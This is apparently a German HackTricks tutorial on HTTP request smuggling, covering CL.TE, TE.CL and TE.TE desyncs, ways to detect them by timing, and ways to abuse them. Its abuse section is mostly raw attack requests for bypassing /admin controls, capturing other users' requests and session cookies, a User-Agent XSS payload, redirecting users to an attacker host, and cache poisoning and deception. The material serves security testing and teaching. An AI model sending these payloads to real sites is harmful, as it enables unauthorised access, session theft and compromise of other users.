# HTTP Request Smuggling / HTTP Desync Attack

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen** oder **HackTricks in PDF herunterladen** m√∂chten, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

## Was ist

Diese Schwachstelle tritt auf, wenn eine **Desynchronisierung** zwischen **Front-End-Proxies** und dem **Back-End**-Server einem **Angreifer** erm√∂glicht, einen HTTP-**Request** zu **senden**, der von den **Front-End-Proxies** (Load Balancer/Reverse-Proxy) als **eine Anfrage** und vom **Back-End**-Server als **2 Anfragen** interpretiert wird.\
Dies erm√∂glicht es einem Benutzer, die **n√§chste Anfrage zu modifizieren, die beim Back-End-Server nach seiner** ankommt.

### Theorie

[**RFC-Spezifikation (2161)**](https://tools.ietf.org/html/rfc2616)

> Wenn eine Nachricht sowohl ein Transfer-Encoding-Headerfeld als auch ein Content-Length-Headerfeld enth√§lt, muss letzteres ignoriert werden.

**Content-Length**

> Der Content-Length-Entit√§tsheader gibt die Gr√∂√üe des Entit√§tsk√∂rpers in Bytes an, der an den Empf√§nger gesendet wird.

**Transfer-Encoding: chunked**

> Der Transfer-Encoding-Header gibt die Art der Codierung an, die verwendet wird, um den Nutzlastk√∂rper sicher an den Benutzer zu √ºbertragen.\
> Chunked bedeutet, dass gro√üe Daten in einer Reihe von Chunks gesendet werden.

### Realit√§t

Das **Front-End** (ein Load-Balancer/Reverse-Proxy) **verarbeitet** den _**Content-Length**_- oder den _**Transfer-Encoding**_-Header und der **Back-End**-Server **verarbeitet den anderen**, was eine **Desynchronisierung** zwischen den beiden Systemen verursacht.\
Dies k√∂nnte sehr kritisch sein, da **ein Angreifer eine Anfrage an den Reverse-Proxy senden kann**, die vom **Back-End**-Server **als 2 verschiedene Anfragen interpretiert wird**. Die **Gefahr** dieser Technik besteht darin, dass der **Back-End**-Server die **injizierte 2. Anfrage** als k√§me sie vom n√§chsten Client und die **echte Anfrage** dieses Clients wird Teil der **injizierten Anfrage** sein.

### Besonderheiten

Denken Sie daran, dass in HTTP **ein Zeilenumbruch aus 2 Bytes besteht:**

* **Content-Length**: Dieser Header verwendet eine **Dezimalzahl**, um die **Anzahl** von **Bytes** des **K√∂rpers** der Anfrage anzugeben. Der K√∂rper wird erwartet, dass er mit dem letzten Zeichen endet, **ein Zeilenumbruch ist am Ende der Anfrage nicht erforderlich**.
* **Transfer-Encoding:** Dieser Header verwendet im **K√∂rper** eine **hexadezimale Zahl**, um die **Anzahl** von **Bytes** des **n√§chsten Chunks** anzugeben. Der **Chunk** muss mit einem **Zeilenumbruch enden**, aber dieser Zeilenumbruch **wird nicht durch den L√§ngenindikator gez√§hlt**. Diese √úbertragungsmethode muss mit einem **Chunk der Gr√∂√üe 0 enden, gefolgt von 2 Zeilenumbr√ºchen**: `0`
* **Connection**: Basierend auf meiner Erfahrung wird empfohlen, **`Connection: keep-alive`** bei der ersten Anfrage des Request Smuggling zu verwenden.

## Grundlegende Beispiele

{% hint style="success" %}
Beim Versuch, dies mit Burp Suite auszunutzen, **deaktivieren Sie `Update Content-Length` und `Normalize HTTP/1 line endings`** im Repeater, da einige Gadgets Zeilenumbr√ºche, Wagenr√ºckl√§ufe und fehlerhafte Content-Lengths missbrauchen.
{% endhint %}

HTTP-Request-Smuggling-Angriffe werden durch den Versand mehrdeutiger Anfragen erstellt, die Diskrepanzen in der Interpretation der `Content-Length` (CL) und `Transfer-Encoding` (TE) Header durch Front-End- und Back-End-Server ausnutzen. Diese Angriffe k√∂nnen sich in verschiedenen Formen manifestieren, haupts√§chlich als **CL.TE**, **TE.CL** und **TE.TE**. Jeder Typ repr√§sentiert eine einzigartige Kombination, wie die Front-End- und Back-End-Server diese Header priorisieren. Die Schwachstellen entstehen daraus, dass die Server dieselbe Anfrage auf unterschiedliche Weise verarbeiten, was zu unerwarteten und potenziell b√∂sartigen Ergebnissen f√ºhren kann.

### Grundlegende Beispiele von Schwachstellentypen

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### CL.TE Schwachstelle (Content-Length vom Front-End verwendet, Transfer-Encoding vom Back-End verwendet)

* **Front-End (CL):** Verarbeitet die Anfrage basierend auf dem `Content-Length`-Header.
* **Back-End (TE):** Verarbeitet die Anfrage basierend auf dem `Transfer-Encoding`-Header.
* **Angriffsszenario:**
* Der Angreifer sendet eine Anfrage, bei der der Wert des `Content-Length`-Headers nicht mit der tats√§chlichen Inhaltsl√§nge √ºbereinstimmt.
* Der Front-End-Server leitet die gesamte Anfrage an das Back-End weiter, basierend auf dem Wert von `Content-Length`.
* Der Back-End-Server verarbeitet die Anfrage aufgrund des `Transfer-Encoding: chunked`-Headers als chunked und interpretiert die verbleibenden Daten als separate, nachfolgende Anfrage.
*   **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL Schwachstelle (Transfer-Encoding vom Front-End verwendet, Content-Length vom Back-End verwendet)

* **Front-End (TE):** Verarbeitet die Anfrage basierend auf dem `Transfer-Encoding`-Header.
* **Back-End (CL):** Verarbeitet die Anfrage basierend auf dem `Content-Length`-Header.
* **Angriffsszenario:**
* Der Angreifer sendet eine chunked Anfrage, bei der die Chunk-Gr√∂√üe (`7b`) und die tats√§chliche Inhaltsl√§nge (`Content-Length: 4`) nicht √ºbereinstimmen.
* Der Front-End-Server leitet die gesamte Anfrage an das Back-End weiter, indem er `Transfer-Encoding` beachtet.
* Der Back-End-Server verarbeitet aufgrund von `Content-Length` nur den Anfang der Anfrage (`7b` Bytes) und l√§sst den Rest als Teil einer unbeabsichtigten nachfolgenden Anfrage.
*   **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```
#### TE.TE Schwachstelle (Transfer-Encoding von beiden verwendet, mit Verschleierung)

* **Server:** Beide unterst√ºtzen `Transfer-Encoding`, aber einer kann durch Verschleierung dazu gebracht werden, es zu ignorieren.
* **Angriffsszenario:**
* Der Angreifer sendet eine Anfrage mit verschleierten `Transfer-Encoding`-Headern.
* Je nachdem, welcher Server (Front-End oder Back-End) die Verschleierung nicht erkennt, kann eine CL.TE- oder TE.CL-Schwachstelle ausgenutzt werden.
* Der nicht verarbeitete Teil der Anfrage, wie von einem der Server gesehen, wird Teil einer nachfolgenden Anfrage, was zu Smuggling f√ºhrt.
*   **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL Szenario (Content-Length von Front-End und Back-End verwendet):**

* Beide Server verarbeiten die Anfrage ausschlie√ülich anhand des `Content-Length`-Headers.
* Dieses Szenario f√ºhrt in der Regel nicht zu Smuggling, da beide Server die Anfragel√§nge auf die gleiche Weise interpretieren.
*   **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normale Anfrage
```

#### **CL != 0 Szenario:**

* Bezieht sich auf Szenarien, in denen der `Content-Length`-Header vorhanden ist und einen Wert ungleich Null aufweist, was darauf hinweist, dass der Anfragek√∂rper Inhalt hat.
* Es ist entscheidend f√ºr das Verst√§ndnis und die Ausf√ºhrung von Smuggling-Angriffen, da es beeinflusst, wie Server das Ende einer Anfrage bestimmen.
*   **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Nicht leerer K√∂rper
```

#### Erzwingen √ºber hop-by-hop-Header

Durch den Missbrauch von hop-by-hop-Headern k√∂nnten Sie dem Proxy anzeigen, **den Header Content-Length oder Transfer-Encoding zu l√∂schen, sodass ein HTTP-Anfragesmuggling m√∂glich ist, um Missbrauch zu betreiben**.
```
Connection: Content-Length
```
F√ºr **weitere Informationen zu hop-by-hop Headern** besuchen Sie:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Auffinden von HTTP-Request-Smuggling

Die Identifizierung von Schwachstellen bei HTTP-Request-Smuggling kann oft mithilfe von Timing-Techniken erreicht werden, die darauf beruhen, wie lange der Server ben√∂tigt, um auf manipulierte Anfragen zu antworten. Diese Techniken sind besonders n√ºtzlich zur Erkennung von CL.TE- und TE.CL-Schwachstellen. Neben diesen Methoden gibt es auch andere Strategien und Tools, die verwendet werden k√∂nnen, um solche Schwachstellen zu finden:

### Auffinden von CL.TE-Schwachstellen mithilfe von Timing-Techniken

* **Methode:**
* Senden Sie eine Anfrage, die, wenn die Anwendung anf√§llig ist, dazu f√ºhrt, dass der Backend-Server auf zus√§tzliche Daten wartet.
*   **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
* **Beobachtung:**
* Der Front-End-Server verarbeitet die Anfrage basierend auf `Content-Length` und unterbricht die Nachricht vorzeitig.
* Der Backend-Server, der eine chunked-Nachricht erwartet, wartet auf den n√§chsten Chunk, der jedoch nie ankommt, was zu einer Verz√∂gerung f√ºhrt.
* **Indikatoren:**
* Timeouts oder lange Verz√∂gerungen bei der Antwort.
* Erhalt eines 400 Bad Request-Fehlers vom Backend-Server, manchmal mit detaillierten Serverinformationen.

### Auffinden von TE.CL-Schwachstellen mithilfe von Timing-Techniken

* **Methode:**
* Senden Sie eine Anfrage, die, wenn die Anwendung anf√§llig ist, dazu f√ºhrt, dass der Backend-Server auf zus√§tzliche Daten wartet.
*   **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
* **Beobachtung:**
* Der Front-End-Server verarbeitet die Anfrage basierend auf `Transfer-Encoding` und leitet die gesamte Nachricht weiter.
* Der Backend-Server, der eine Nachricht basierend auf `Content-Length` erwartet, wartet auf zus√§tzliche Daten, die jedoch nie eintreffen, was zu einer Verz√∂gerung f√ºhrt.

### Andere Methoden zum Auffinden von Schwachstellen

* **Differenzielle Antwortanalyse:**
* Senden Sie leicht abgewandelte Versionen einer Anfrage und beobachten Sie, ob sich die Serverantworten auf unerwartete Weise unterscheiden, was auf eine Analyse-Diskrepanz hinweist.
* **Verwendung automatisierter Tools:**
* Tools wie die 'HTTP Request Smuggler'-Erweiterung von Burp Suite k√∂nnen automatisch auf diese Schwachstellen testen, indem sie verschiedene Formen von mehrdeutigen Anfragen senden und die Antworten analysieren.
* **Tests zur Content-Length-Varianz:**
* Senden Sie Anfragen mit unterschiedlichen `Content-Length`-Werten, die nicht mit der tats√§chlichen Inhaltsl√§nge √ºbereinstimmen, und beobachten Sie, wie der Server mit solchen Abweichungen umgeht.
* **Tests zur Transfer-Encoding-Varianz:**
* Senden Sie Anfragen mit verschleierten oder fehlerhaften `Transfer-Encoding`-Headern und √ºberwachen Sie, wie unterschiedlich der Front-End- und Back-End-Server auf solche Manipulationen reagieren.

### Testen von HTTP-Request-Smuggling-Schwachstellen

Nach Best√§tigung der Wirksamkeit von Timing-Techniken ist es entscheidend zu √ºberpr√ºfen, ob Client-Anfragen manipuliert werden k√∂nnen. Eine einfache Methode besteht darin, Ihre Anfragen zu manipulieren, beispielsweise eine Anfrage an `/` zu senden, die eine 404-Antwort ausl√∂st. Die zuvor diskutierten `CL.TE`- und `TE.CL`-Beispiele in [Grundlegende Beispiele](./#basic-examples) zeigen, wie man eine Client-Anfrage manipuliert, um eine 404-Antwort hervorzurufen, obwohl der Client versucht, auf eine andere Ressource zuzugreifen.

**Wichtige √úberlegungen**

Beim Testen von Request-Smuggling-Schwachstellen durch Eingriffe in andere Anfragen beachten Sie:

* **Unterschiedliche Netzwerkverbindungen:** Die "Angriffs-" und "normalen" Anfragen sollten √ºber separate Netzwerkverbindungen gesendet werden. Die Verwendung derselben Verbindung f√ºr beide best√§tigt nicht das Vorhandensein der Schwachstelle.
* **Konsistente URL und Parameter:** Versuchen Sie, f√ºr beide Anfragen identische URLs und Parameter zu verwenden. Moderne Anwendungen leiten Anfragen oft an spezifische Backend-Server basierend auf URL und Parametern weiter. Durch die √úbereinstimmung wird die Wahrscheinlichkeit erh√∂ht, dass beide Anfragen vom selben Server verarbeitet werden, eine Voraussetzung f√ºr einen erfolgreichen Angriff.
* **Timing und Rennbedingungen:** Die "normale" Anfrage, die dazu dient, St√∂rungen von der "Angriffs-" Anfrage zu erkennen, konkurriert mit anderen gleichzeitigen Anwendungsanfragen. Senden Sie daher die "normale" Anfrage unmittelbar nach der "Angriffs-" Anfrage. Bei stark frequentierten Anwendungen sind m√∂glicherweise mehrere Versuche erforderlich, um die Schwachstelle abschlie√üend zu best√§tigen.
* **Herausforderungen bei der Lastverteilung:** Front-End-Server, die als Lastenausgleicher fungieren, k√∂nnen Anfragen auf verschiedene Backend-Systeme verteilen. Wenn die "Angriffs-" und "normalen" Anfragen auf unterschiedlichen Systemen landen, wird der Angriff nicht erfolgreich sein. Dieser Aspekt der Lastverteilung erfordert m√∂glicherweise mehrere Versuche, um eine Schwachstelle zu best√§tigen.
* **Unbeabsichtigte Benutzerbeeintr√§chtigung:** Wenn Ihr Angriff unbeabsichtigt die Anfrage eines anderen Benutzers beeinflusst (nicht die "normale" Anfrage, die Sie zur Erkennung gesendet haben), deutet dies darauf hin, dass Ihr Angriff einen anderen Anwendungsbenutzer beeinflusst hat. Kontinuierliche Tests k√∂nnten andere Benutzer st√∂ren und erfordern einen vorsichtigen Ansatz.

## Missbrauch von HTTP-Request-Smuggling

### Um Front-End-Sicherheitskontrollen zu umgehen

### Umgehen von Front-End-Sicherheit durch HTTP-Request-Smuggling

Manchmal setzen Front-End-Proxys Sicherheitsma√ünahmen durch, indem sie eingehende Anfragen √ºberpr√ºfen. Diese Ma√ünahmen k√∂nnen jedoch durch den Missbrauch von HTTP-Request-Smuggling umgangen werden, was unbefugten Zugriff auf eingeschr√§nkte Endpunkte erm√∂glicht. Beispielsweise k√∂nnte der Zugriff auf `/admin` extern untersagt sein, wobei der Front-End-Proxy solche Versuche aktiv blockiert. Dennoch k√∂nnte dieser Proxy es vers√§umen, eingebettete Anfragen innerhalb einer geschmuggelten HTTP-Anfrage zu √ºberpr√ºfen, was eine Schlupfloch f√ºr das Umgehen dieser Einschr√§nkungen darstellt.

Betrachten Sie die folgenden Beispiele, die veranschaulichen, wie HTTP-Request-Smuggling verwendet werden kann, um Front-End-Sicherheitskontrollen zu umgehen, wobei speziell der `/admin`-Pfad ins Visier genommen wird, der normalerweise vom Front-End-Proxy gesch√ºtzt wird:

**CL.TE Beispiel**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
Im CL.TE-Angriff wird der `Content-Length`-Header f√ºr die erste Anfrage genutzt, w√§hrend die nachfolgende eingebettete Anfrage den `Transfer-Encoding: chunked`-Header verwendet. Der Front-End-Proxy verarbeitet die anf√§ngliche `POST`-Anfrage, √ºberpr√ºft jedoch nicht die eingebettete `GET /admin`-Anfrage, was unbefugten Zugriff auf den Pfad `/admin` erm√∂glicht.

**TE.CL Beispiel**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Im TE.CL-Angriff verwendet die anf√§ngliche `POST`-Anfrage `Transfer-Encoding: chunked`, und die nachfolgende eingebettete Anfrage wird anhand des `Content-Length`-Headers verarbeitet. √Ñhnlich wie beim CL.TE-Angriff √ºbersieht der Front-End-Proxy die geschmuggelte `GET /admin`-Anfrage und gew√§hrt unbeabsichtigt Zugriff auf den eingeschr√§nkten `/admin`-Pfad.

### Offenlegung der Umleitung von Front-End-Anfragen <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Anwendungen verwenden oft einen **Front-End-Server**, um eingehende Anfragen vor der Weiterleitung an den Back-End-Server zu modifizieren. Eine typische Modifikation besteht darin, Header wie `X-Forwarded-For: <IP des Clients>` hinzuzuf√ºgen, um die IP des Clients an den Back-End weiterzuleiten. Das Verst√§ndnis dieser Modifikationen kann entscheidend sein, da sie m√∂glicherweise Wege zum **Umgehen von Schutzma√ünahmen** oder zum **Aufdecken verborgener Informationen oder Endpunkte** aufzeigen.

Um zu untersuchen, wie ein Proxy eine Anfrage √§ndert, suchen Sie nach einem POST-Parameter, den das Back-End in der Antwort wiedergibt. Erstellen Sie dann eine Anfrage, wobei dieser Parameter zuletzt verwendet wird, √§hnlich wie folgt:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
In dieser Struktur werden nach `search=` die nachfolgenden Anforderungskomponenten angeh√§ngt, die im Antwortteil reflektiert werden. Diese Reflexion wird die Header der nachfolgenden Anfrage offenlegen.

Es ist wichtig, den `Content-Length`-Header der verschachtelten Anfrage mit der tats√§chlichen Inhaltsl√§nge abzustimmen. Es ist ratsam, mit einem kleinen Wert zu beginnen und allm√§hlich zu erh√∂hen, da ein zu niedriger Wert die reflektierten Daten abschneiden wird, w√§hrend ein zu hoher Wert dazu f√ºhren kann, dass die Anfrage fehlschl√§gt.

Diese Technik ist auch im Zusammenhang mit einer TE.CL-Schwachstelle anwendbar, aber die Anfrage sollte mit `search=\r\n0` enden. Unabh√§ngig von den Zeilenumbr√ºchen werden die Werte an den Suchparameter angeh√§ngt.

Dieses Verfahren dient haupts√§chlich dazu, die Anforderungs√§nderungen zu verstehen, die vom Front-End-Proxy vorgenommen wurden, und f√ºhrt im Wesentlichen eine selbstgerichtete Untersuchung durch.

### Erfassen von Anfragen anderer Benutzer <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Es ist m√∂glich, die Anfragen des n√§chsten Benutzers zu erfassen, indem man eine spezifische Anfrage als Wert eines Parameters w√§hrend einer POST-Operation anh√§ngt. So kann dies erreicht werden:

Durch Anh√§ngen der folgenden Anfrage als Wert eines Parameters k√∂nnen Sie die nachfolgende Anfrage des Clients speichern:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
In diesem Szenario ist der **Kommentarparameter** dazu gedacht, die Inhalte innerhalb des Kommentarbereichs eines √∂ffentlich zug√§nglichen Seitenposts zu speichern. Folglich erscheinen die Inhalte des nachfolgenden Requests als Kommentar.

Diese Technik hat jedoch Einschr√§nkungen. Im Allgemeinen erfasst sie nur Daten bis zum Parameter-Trennzeichen, das im geschmuggelten Request verwendet wird. Bei URL-codierten Formular√ºbermittlungen ist dieses Trennzeichen das Zeichen `&`. Das bedeutet, dass der erfasste Inhalt aus dem Request des Opferbenutzers am ersten `&` endet, das m√∂glicherweise sogar Teil der Abfragezeichenfolge ist.

Dar√ºber hinaus ist zu beachten, dass dieser Ansatz auch bei einer TE.CL-Verwundbarkeit m√∂glich ist. In solchen F√§llen sollte der Request mit `search=\r\n0` enden. Unabhh√§ngig von Zeilenumbruchzeichen werden die Werte dem Suchparameter angeh√§ngt.

### Verwendung von HTTP-Request-Smuggling zur Ausnutzung von reflektiertem XSS

HTTP-Request-Smuggling kann genutzt werden, um Webseiten auszunutzen, die anf√§llig f√ºr **Reflektiertes XSS** sind, und bietet erhebliche Vorteile:

* Die Interaktion mit den Zielbenutzern ist **nicht erforderlich**.
* Erm√∂glicht die Ausnutzung von XSS in Teilen des Requests, die normalerweise **nicht erreichbar** sind, wie z. B. den HTTP-Request-Headern.

In Szenarien, in denen eine Website anf√§llig f√ºr Reflektiertes XSS √ºber den User-Agent-Header ist, zeigt das folgende Payload, wie diese Verwundbarkeit ausgenutzt werden kann:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Dieses Payload ist strukturiert, um die Schwachstelle auszunutzen, indem:

1. Ein `POST`-Request initiiert wird, scheinbar typisch, mit einem `Transfer-Encoding: chunked`-Header, um den Beginn des Smugglings anzugeben.
2. Es folgt eine `0`, die das Ende des chunked Nachrichtenrumpfs markiert.
3. Anschlie√üend wird ein geschmuggelter `GET`-Request eingef√ºhrt, bei dem der `User-Agent`-Header mit einem Skript, `<script>alert(1)</script>`, injiziert wird, das das XSS ausl√∂st, wenn der Server diesen nachfolgenden Request verarbeitet.

Durch die Manipulation des `User-Agent` mittels Smuggling umgeht das Payload normale Anforderungsbeschr√§nkungen und nutzt so die Reflected XSS-Schwachstelle auf eine nicht standardm√§√üige, aber effektive Weise aus.

### Verwendung von HTTP-Request-Smuggling, um eine interne Weiterleitung in eine offene Weiterleitung umzuwandeln <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

### Ausnutzen von internen Weiterleitungen mit HTTP-Request-Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Anwendungen leiten oft von einer URL zu einer anderen weiter, indem sie den Hostnamen aus dem `Host`-Header in der Weiterleitungs-URL verwenden. Dies ist bei Webservern wie Apache und IIS √ºblich. Beispielsweise f√ºhrt die Anforderung eines Ordners ohne abschlie√üenden Schr√§gstrich zu einer Weiterleitung, die den Schr√§gstrich einschlie√üt:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Ergebnisse in:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Obwohl dieses Verhalten scheinbar harmlos ist, kann es durch HTTP-Request-Smuggling manipuliert werden, um Benutzer auf eine externe Website umzuleiten. Zum Beispiel:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Diese geschmuggelte Anfrage k√∂nnte dazu f√ºhren, dass die n√§chste verarbeitete Benutzeranfrage auf eine von einem Angreifer kontrollierte Website umgeleitet wird:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Ergebnisse in:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
### Verwendung von HTTP-Request-Smuggling zur Durchf√ºhrung von Web-Cache-Vergiftung <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

### Ausnutzung der Web-Cache-Vergiftung √ºber HTTP-Request-Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Web-Cache-Vergiftung kann durchgef√ºhrt werden, wenn ein beliebiger Bestandteil der **Front-End-Infrastruktur Inhalte zwischenspeichert**, in der Regel zur Leistungssteigerung. Durch Manipulation der Serverantwort ist es m√∂glich, den **Cache zu vergiften**.

Zuvor haben wir beobachtet, wie Serverantworten so ver√§ndert werden konnten, dass ein 404-Fehler zur√ºckgegeben wird (siehe [Grundlegende Beispiele](./#basic-examples)). Ebenso ist es m√∂glich, den Server dazu zu bringen, den Inhalt von `/index.html` als Antwort auf eine Anfrage nach `/static/include.js` zu liefern. Folglich wird der Inhalt von `/static/include.js` im Cache durch den von `/index.html` ersetzt, wodurch `/static/include.js` f√ºr Benutzer unzug√§nglich wird und m√∂glicherweise zu einem Denial-of-Service (DoS) f√ºhrt.

Diese Technik wird besonders wirksam, wenn eine **Open-Redirect-Schwachstelle** entdeckt wird oder wenn es eine **Weiterleitung vor Ort zu einem offenen Redirect** gibt. Solche Schwachstellen k√∂nnen ausgenutzt werden, um den zwischengespeicherten Inhalt von `/static/include.js` durch ein Skript unter der Kontrolle des Angreifers zu ersetzen, was im Wesentlichen einen weit verbreiteten Cross-Site-Scripting (XSS)-Angriff gegen alle Clients erm√∂glicht, die das aktualisierte `/static/include.js` anfordern.

Im Folgenden ist eine Darstellung der Ausnutzung der **Cache-Vergiftung in Kombination mit einer Weiterleitung vor Ort zu einem offenen Redirect**. Das Ziel ist es, den Cache-Inhalt von `/static/include.js` so zu √§ndern, dass JavaScript-Code, der vom Angreifer kontrolliert wird, bereitgestellt wird:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Beachten Sie die eingebettete Anfrage, die auf `/post/next?postId=3` abzielt. Diese Anfrage wird auf `/post?postId=4` umgeleitet, wobei der **Host-Header-Wert** verwendet wird, um die Domain zu bestimmen. Durch √Ñndern des **Host-Headers** kann der Angreifer die Anfrage auf ihre Domain umleiten (**On-Site-Weiterleitung zu Off-Site-Weiterleitung**).

Nach erfolgreichem **Socket-Poisoning** sollte eine **GET-Anfrage** f√ºr `/static/include.js` initiiert werden. Diese Anfrage wird durch die vorherige **On-Site-Weiterleitung zu Off-Site-Weiterleitung**-Anfrage kontaminiert und ruft den Inhalt des vom Angreifer kontrollierten Skripts ab.

Anschlie√üend wird jede Anfrage nach `/static/include.js` den zwischengespeicherten Inhalt des Skripts des Angreifers bedienen und so einen umfassenden XSS-Angriff starten.

### Verwendung von HTTP-Request-Smuggling zur Durchf√ºhrung von Web-Cache-T√§uschung <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Was ist der Unterschied zwischen Web-Cache-Poisoning und Web-Cache-T√§uschung?**
>
> * Bei **Web-Cache-Poisoning** veranlasst der Angreifer die Anwendung, einige b√∂sartige Inhalte im Cache zu speichern, die dann anderen Anwendungsbenutzern aus dem Cache bereitgestellt werden.
> * Bei **Web-Cache-T√§uschung** veranlasst der Angreifer die Anwendung, einige sensible Inhalte eines anderen Benutzers im Cache zu speichern, und der Angreifer ruft dann diese Inhalte aus dem Cache ab.

Der Angreifer erstellt eine geschmuggelte Anfrage, die sensible benutzerspezifische Inhalte abruft. Betrachten Sie das folgende Beispiel:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Wenn dieser geschmuggelte Request einen Cache-Eintrag vergiftet, der f√ºr statische Inhalte vorgesehen ist (z. B. `/someimage.png`), k√∂nnten die sensiblen Daten des Opfers aus `/private/messages` unter dem Cache-Eintrag des statischen Inhalts zwischengespeichert werden. Folglich k√∂nnte der Angreifer diese zwischengespeicherten sensiblen Daten potenziell abrufen.

